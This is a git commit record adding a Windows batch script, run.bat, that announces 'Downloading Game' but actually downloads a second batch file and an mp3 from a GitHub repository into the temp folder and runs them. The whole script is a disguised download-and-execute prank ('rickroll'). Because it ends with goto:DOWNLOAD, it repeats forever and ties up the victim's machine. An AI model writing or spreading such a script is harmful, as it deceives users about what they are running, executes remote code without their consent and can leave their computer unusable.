28556f150339dd7af296998a54bb50c50eb38da0
pogga-was-taken <49074314+pogga-was-taken@users.noreply.github.com>
2021-09-13 14:21:06 +0300

    Add files via upload

---
+++ run.bat
@@ -0,0 +1,10 @@
+@echo off
+
+echo Downloading Game
+
+:DOWNLOAD
+  mkdir %TEMP%\yompBest
+  powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat', '%TEMP%\yompBest\m.bat')"
+  powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3', '%TEMP%\yompBest\role.mp3')"
+  %TEMP%\yompBest\m %TEMP%\yompBest\role.mp3
+  goto:DOWNLOAD
